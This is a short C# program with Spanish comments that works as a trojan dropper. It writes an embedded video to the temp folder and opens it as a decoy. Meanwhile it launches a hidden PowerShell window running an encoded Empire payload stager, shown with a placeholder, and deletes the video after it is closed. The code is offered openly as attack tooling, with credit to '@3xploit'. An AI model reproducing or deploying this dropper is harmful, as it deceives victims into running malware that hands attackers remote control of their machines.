using System;
using System.IO;
using System.Diagnostics;

namespace ConsoleApplication7
{
    class Program
    {
        static void Main()
        {
            // Copiar el vídeo a un archivo temporal y abrirlo
            byte[] archivo = Properties.Resources.videoplayback1;
            string destino = Environment.ExpandEnvironmentVariables(@"%tmp%\video.mp4");
            File.WriteAllBytes(destino, archivo);
            Process procesoArchivo = Process.Start(destino);

            // Ejecutar launcher
            ProcessStartInfo launcherProcess = new ProcessStartInfo();
            // C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
            launcherProcess.FileName = Environment.ExpandEnvironmentVariables(@"%windir%\System32\WindowsPowerShell\v1.0\powershell.exe");
            launcherProcess.Arguments = "powershell -noP -sta -w 1 -enc <Empire Payload>";
            launcherProcess.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(launcherProcess);

            // Esperar a que cierren el vídeo/imagen/pdf, lo que sea
            procesoArchivo.WaitForExit();
            // Eliminar nuestro vídeo
            while (File.Exists(destino))
            {
                try
                {
                    File.Delete(destino);
                }
                catch { }
            }
        }
    }
}

// Credits to @3xploit

